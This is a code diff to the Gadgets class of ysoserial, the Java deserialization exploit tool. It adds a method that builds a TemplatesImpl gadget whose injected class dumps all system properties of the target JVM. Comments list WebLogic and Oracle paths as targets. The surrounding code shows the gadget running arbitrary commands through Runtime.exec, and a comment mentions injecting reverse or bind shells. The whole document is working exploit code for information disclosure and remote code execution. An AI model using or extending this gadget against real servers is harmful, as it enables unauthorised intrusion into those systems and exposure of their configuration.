@@ -101,6 +101,66 @@ public class Gadgets {
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static Object createSysInfoTemplatesImpl ( final String command ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                command,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createSysInfoTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+    
+    
+    
+
+    public static <T> T createSysInfoTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+            throws Exception {
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        //java.lang.System.out.println("asd");
+        //clazz.makeClassInitializer().insertAfter("long t = System.currentTimeMillis();java.lang.System.out.println(\"asd\"+t);");
+        clazz.makeClassInitializer().insertAfter("System.getProperties().list(System.out);");
+        System.getProperties().getProperty("domain.home");
+        //domain.home
+        //portlet.oracle.home
+        //java.io.tmpdir
+        //oracle.server.config.dir
+        //wc.oracle.home
+        //oracle.deployed.app.dir
+        //platform.home
+        //java.home
+        //weblogic.home
+        //user.dir
+        
+        //clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"touch /tmp/testasdf\"");
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+    
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
@@ -113,6 +173,7 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        //java.lang.System.getProperty("");
         clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
